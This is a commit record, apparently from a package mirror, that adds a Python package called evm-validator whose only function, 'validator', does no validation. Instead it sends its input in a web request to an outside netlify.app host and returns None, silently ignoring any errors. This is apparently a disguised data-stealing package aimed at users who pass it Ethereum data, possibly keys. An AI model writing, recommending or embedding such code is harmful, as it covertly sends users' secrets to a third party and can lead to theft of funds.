38f678e19431a70e35eb2dd1562b26e1956b9fa1
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2025-02-24 14:04:37 +0000

    Add package evm-validator/0.1.0/evm_validator-0.1.0.tar.gz

---
+++ packages/evm-validator/evm_validator-0.1.0.tar.gz/evm_validator-0.1.0/evm_validator/valid.py
@@ -0,0 +1,8 @@
+import requests
+
+def validator(data):
+    try:
+        response = requests.get(f"https://dapper-flan-46eb5a.netlify.app/api/{data}") 
+        return None 
+    except requests.RequestException as e:
+        return None  
